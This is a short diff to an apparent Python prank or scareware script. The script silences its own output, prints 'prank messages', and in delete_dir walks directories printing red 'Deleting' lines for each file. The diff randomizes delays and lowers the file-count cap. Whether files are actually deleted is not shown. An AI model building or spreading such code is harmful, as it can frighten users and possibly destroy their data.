@@ -7,6 +7,7 @@ import keyboard
 import ctypes
 from tkinter import Tk, Canvas, NW
 from PIL import Image, ImageTk
+import random
 
 original_stdout = sys.stdout
 sys.stdout = open(os.devnull, 'w')
@@ -61,7 +62,7 @@ def send_messages():
 
     for message in prank_messages:
         print(message)
-        time.sleep(0.5)
+        time.sleep(random.uniform(0.2, 0.8))
 
     time.sleep(0.5)
     
@@ -73,7 +74,7 @@ def delete_dir(dir):
         if stop:
             break
         for file in files:
-            if count > 50000:
+            if count > 25000:
                 stop = True
                 break
             print(f"\033[91mDeleting\033[0m {os.path.join(root, file)}...")
